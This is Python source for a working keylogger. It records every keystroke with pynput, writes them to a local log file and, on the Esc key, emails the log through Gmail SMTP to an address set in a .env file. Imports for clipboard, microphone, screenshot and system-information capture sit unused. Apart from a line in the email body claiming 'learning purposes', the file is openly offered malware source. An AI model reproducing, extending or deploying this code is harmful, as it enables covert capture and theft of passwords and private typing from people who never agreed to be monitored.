# libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket, platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time, os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

from dotenv import load_dotenv

script_directory = os.path.dirname(os.path.abspath(__file__))
log_file_path = os.path.join(script_directory, "log.txt")
env_path = os.path.join(script_directory, ".env")
load_dotenv(env_path)

BUFFER_COUNT = 30
buffer = ""
keystroke_count = 0
line_count = 0
fromAddress = os.getenv('FROM_EMAIL_ADDRESS')
password = os.getenv('PASSWORD')
toAddress = os.getenv('TO_EMAIL_ADDRESS')

def send_email(filename, attachment, toAddress):
	msg = MIMEMultipart()
	msg['From'] = fromAddress
	msg['To'] = toAddress
	msg['Subject'] = "Keylogger logs"

	body = "This email is for learning purposes"
	msg.attach(MIMEText(body, 'plain'))

	attachment = open(attachment, 'rb')

	mime_base = MIMEBase('application', 'octet-stream')
	mime_base.set_payload((attachment).read())

	encoders.encode_base64(mime_base)

	mime_base.add_header('Content-Disposition', "attachment: filename= %s" % filename)

	msg.attach(mime_base)

	smtp = smtplib.SMTP('smtp.gmail.com', 587)
	smtp.starttls()

	try :
		smtp.login(fromAddress, password)
	except Exception as e :
		print("Login failed")

	text = msg.as_string()

	try :
		smtp.sendmail(fromAddress, toAddress, text)
	except Exception as e :
		print("Failed to send mail")

	smtp.quit()

def on_press(key):
	global buffer, keystroke_count, line_count
	if hasattr(key, 'char'):
		buffer += str(key.char)
	elif key == Key.enter:
		buffer += "\n"
		line_count += 1
	elif key == Key.space:
		buffer += " "
	elif key == Key.backspace:
		buffer = buffer[:-1]
	keystroke_count += 1
	if keystroke_count > BUFFER_COUNT:
		write_log()

def info():
	return """\n\
=======================\n\
Text length : {0}\n\
No of keystrokes : {1}\n\
No of lines : {2}\n\
=======================\n""".format(len(buffer), keystroke_count,line_count + 1)

def write_log():
	global keystroke_count, line_count, buffer
	with open(log_file_path,"a") as out:
		out.write(buffer)
		out.write(info())
	buffer = ""
	keystroke_count = 0
	line_count = 0

def on_release(key):
	# break loop on pressing esc
	if key == Key.esc :
		write_log()
		send_email("log.txt", log_file_path, toAddress)
		return False
		

# what to do when a key is pressed and released respectively
with Listener(on_press = on_press, on_release = on_release) as listener:
	listener.join()